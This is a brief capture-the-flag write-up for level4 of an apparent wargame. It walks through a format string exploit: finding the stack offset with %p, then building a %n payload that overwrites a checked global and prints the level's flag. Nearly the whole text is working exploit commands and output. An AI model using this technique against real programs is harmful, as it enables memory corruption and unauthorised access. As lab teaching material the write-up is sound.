### Exploit

Format string exploit, here I come. We hit the stack with 12 %ps this time around.

```
    level4@RainFall:~$ ./level4
    AAAA%12$p
    AAAA0x41414141
    level4@RainFall:~$ python -c 'print "\x10\x98\x49\x08" + "%12$p"' | ./level4
    �I�0x08499810
```


```
    0x0804848d <+54>:	mov    eax,ds:0x8049810
    0x08048492 <+59>:	cmp    eax,0x1025544
```

16930116 is 0x1025544 in hexadecimal. Leaving 4 bytes for an address, print the "first" 16930112 characters and then...

```
    level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%16930112x%12\$n'" > /tmp/payload
    level4@RainFall:~$ cat /tmp/payload - | ./level4
    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
